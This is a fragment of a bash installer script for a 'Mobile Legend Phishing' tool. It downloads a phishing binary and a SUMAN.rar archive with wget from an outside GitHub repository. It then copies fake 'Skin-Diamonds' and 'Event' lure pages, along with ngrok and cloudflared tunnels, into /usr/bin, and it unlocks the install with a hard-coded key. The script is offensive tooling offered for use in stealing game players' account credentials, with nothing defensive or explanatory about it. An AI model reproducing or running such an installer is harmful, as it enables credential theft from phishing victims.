...
clear
echo ""
rm -rf MobileLegend-Phishing
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Mobile_Legend/SM/OH/MobileLegend-Phishing
clear
echo -e ""
echo ""
...
echo ""
echo ""
rm -rf /usr/bin/.SUMAN/1-Skin-Diamonds
rm -rf /usr/bin/.SUMAN/2-Event-Red
rm -rf /usr/bin/.SUMAN/3-Event-Blue
rm -rf /usr/bin/OnlineHacking/LOGO.sh
rm -rf /usr/bin/OnlineHacking/LOGO2.sh
rm -rf /usr/bin/MobileLegend-Phishing
rm -rf /usr/bin/ngrok
...
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/v/i2urPo  "
echo ""
echo ""
echo ""
...
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/MobileLegend-Key  "
echo ""
echo ""
...
echo""
echo""
if [[ $option == *'abcdef12b487e882766d55a4b69b65a'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
...
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Mobile_Legend/SM/SUMAN.rar -O SUMAN.rar
...
echo ""
echo
cp -R cloudflared-linux-386 ngrok .SUMAN/1-Skin-Diamonds/
cp -R cloudflared-linux-386 ngrok .SUMAN/2-Event-Red/
cp -R cloudflared-linux-386 ngrok .SUMAN/3-Event-Blue/
...
cp -R .SUMAN /usr/bin/
cp -R MobileLegend /usr/bin/
cp -R MobileLegend-Phishing /usr/bin/
cp -R ML /usr/bin/
...
rm -rf .SUMAN
echo
echo -e "\e[35m[+] Connect Online Hacking Mobile Legend Hacking Server......  \e[m "
sleep 2
echo
echo
clear
...
sleep 4
echo
echo -e "\e[1m \e[36m[+] There Mobile Legend Phishing Tool Ready \e[m \e[21"
echo
echo
echo -e "\e[92m[+] Open New type this command:\e[93m MobileLegend-Phishing \e[m "
echo
fi
sleep 3
echo
